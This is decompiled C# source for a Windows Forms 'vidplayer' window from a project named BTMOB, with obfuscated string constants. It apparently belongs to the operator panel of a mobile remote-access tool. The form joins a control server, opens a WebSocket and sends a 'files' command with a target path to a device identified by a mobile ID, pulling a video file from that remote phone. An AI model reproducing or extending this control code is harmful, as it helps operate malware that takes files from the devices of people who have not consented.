using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Newtonsoft.Json.Linq;

namespace BTMOB;

[DesignerGenerated]
public class vidplayer : Form
{
	private IContainer components;

	private WebSocketClient websockclient;

	private string targetfilepath;

	public string targetfilename;

	private string mobid;

	private string addressip;

	private string SecoundIDF;

	private ServersInfo Serverinf;

	[field: AccessedThroughProperty("viewimage")]
	internal virtual PictureBox viewimage
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("durprogress")]
	internal virtual DrakeUITrackBar durprogress
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.vidplayer));
		this.viewimage = new System.Windows.Forms.PictureBox();
		this.durprogress = new DrakeUI.Framework.DrakeUITrackBar();
		((System.ComponentModel.ISupportInitialize)this.viewimage).BeginInit();
		base.SuspendLayout();
		this.viewimage.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.viewimage.Dock = System.Windows.Forms.DockStyle.Fill;
		this.viewimage.Location = new System.Drawing.Point(0, 0);
		this.viewimage.Name = EXGuarder._000A351B;
		this.viewimage.Size = new System.Drawing.Size(445, 349);
		this.viewimage.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
		this.viewimage.TabIndex = 0;
		this.viewimage.TabStop = false;
		this.durprogress.DisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.durprogress.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.durprogress.Enabled = false;
		this.durprogress.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.durprogress.Font = new System.Drawing.Font(EXGuarder._4F2E6229, 12f);
		this.durprogress.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.durprogress.Location = new System.Drawing.Point(0, 349);
		this.durprogress.Name = EXGuarder._58522C46;
		this.durprogress.RectColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.durprogress.Size = new System.Drawing.Size(445, 16);
		this.durprogress.Style = DrakeUI.Framework.UIStyle.Custom;
		this.durprogress.TabIndex = 44;
		this.durprogress.Text = EXGuarder._18665B37;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(445, 365);
		base.Controls.Add(this.viewimage);
		base.Controls.Add(this.durprogress);
		this.DoubleBuffered = true;
		this.Font = new System.Drawing.Font(EXGuarder._4F2E6229, 9f);
		this.ForeColor = System.Drawing.Color.White;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow;
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._0503523E);
		base.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		base.Name = EXGuarder._6D6B5B79;
		this.Text = EXGuarder._310D130B;
		((System.ComponentModel.ISupportInitialize)this.viewimage).EndInit();
		base.ResumeLayout(false);
	}

	public vidplayer(string Tpath, string Tname, string idmob, string adrs, string sidf, ServersInfo srvinfo)
	{
		base.Load += vidplayer_Load;
		base.FormClosing += vidplayer_FormClosing;
		websockclient = null;
		targetfilepath = EXGuarder._500E626B;
		targetfilename = EXGuarder._500E626B;
		mobid = EXGuarder._500E626B;
		addressip = EXGuarder._500E626B;
		SecoundIDF = EXGuarder._500E626B;
		InitializeComponent();
		targetfilepath = Tpath;
		targetfilename = Tname;
		mobid = idmob;
		addressip = adrs;
		SecoundIDF = sidf;
		Serverinf = srvinfo;
	}

	private void vidplayer_Load(object sender, EventArgs e)
	{
		base.StartPosition = FormStartPosition.Manual;
		Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
		base.Location = new Point(checked(workingArea.Right - base.Width), workingArea.Top);
		Nativz.SetWindowPos(hWndInsertAfter: new IntPtr(-1), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
		Thread thread = new Thread([SpecialName] () =>
		{
			loadvideo();
		});
		thread.IsBackground = true;
		thread.Start();
	}

	private async void loadvideo()
	{
		try
		{
			string serverNextKey = ServersMgr.GetServerNextKey(Serverinf.Address);
			string json = await MyServer.JoinServer(new VB_0024AnonymousType_3<string, string, string, string>("join", "0", "0", serverNextKey), Serverinf.MainhttpClient, Serverinf.Address);
			JObject jObject;
			try
			{
				jObject = JObject.Parse(json);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				MyMsg.Show("Error load video", "Invalid server response.", MyMsg.msgtype.errors, use_no: false);
				CloseFormSafe();
				ProjectData.ClearProjectError();
				return;
			}
			if (jObject["Success"] == null)
			{
				MyMsg.Show("Error load video", "Server rejected connection.", MyMsg.msgtype.errors, use_no: false);
				CloseFormSafe();
				return;
			}
			string text = jObject["Success"].ToString().Trim('"');
			websockclient = new WebSocketClient(BTConst.vidplerstr, addressip, Serverinf);
			try
			{
				await websockclient.ConnectAsync(text);
			}
			catch (TimeoutException projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				MyMsg.Show("Error load video", "Connection timeout.", MyMsg.msgtype.errors, use_no: false);
				CloseFormSafe();
				ProjectData.ClearProjectError();
				return;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Exception ex3 = ex2;
				MyMsg.Show("Error load video", "Connection failed: " + ex3.Message, MyMsg.msgtype.errors, use_no: false);
				CloseFormSafe();
				ProjectData.ClearProjectError();
				return;
			}
			Debuger.Log_d("IDF Ready to use", text);
			VB_0024AnonymousType_4<string, string, string, string, string> data = new VB_0024AnonymousType_4<string, string, string, string, string>("V", targetfilepath, "1", text, "true");
			string value = BTCommand.FormatCommand("files", data);
			Dictionary<string, object> chatData = new Dictionary<string, object>
			{
				{
					"msg",
					BTConst.wrk
				},
				{ "cmnd", value }
			};
			BTEngine.commands(chatData, mobid, websockclient);
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Exception ex5 = ex4;
			Exception ex6 = ex5;
			MyMsg.Show("Error load video", ex6.Message, MyMsg.msgtype.errors, use_no: false);
			CloseFormSafe();
			ProjectData.ClearProjectError();
		}
	}

	private void CloseFormSafe()
	{
		if (base.IsHandleCreated)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				Close();
			}));
		}
	}

	private void vidplayer_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (websockclient != null)
		{
			websockclient.Disconnect(BTConst.vidplerstr, addressip);
			websockclient = null;
		}
	}
}
